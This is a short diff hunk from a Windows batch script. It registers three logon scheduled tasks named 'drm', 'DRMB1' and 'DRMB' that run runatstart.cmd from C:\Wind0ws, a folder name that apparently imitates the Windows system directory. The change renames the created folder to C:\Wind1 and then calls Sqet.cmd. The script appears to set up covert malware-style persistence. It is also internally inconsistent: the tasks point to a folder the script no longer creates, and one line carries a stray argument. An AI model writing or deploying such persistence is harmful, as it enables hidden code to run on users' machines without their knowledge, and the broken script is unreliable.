@@ -45,5 +45,5 @@ SchTasks /Create  /SC ONLOGON /TN "drm"  /TR t C:\Wind0ws\runatstart.cmd
  SchTasks /Create  /SC ONLOGON /TN "DRMB1"  /TR  C:\Wind0ws\runatstart.cmd
  SchTasks /Create  /SC ONLOGON /TN "DRMB"  /TR C:\Wind0ws\runatstart.cmd
 
-md   C:\Wind0ws
+md   C:\Wind1
 Sqet.cmd
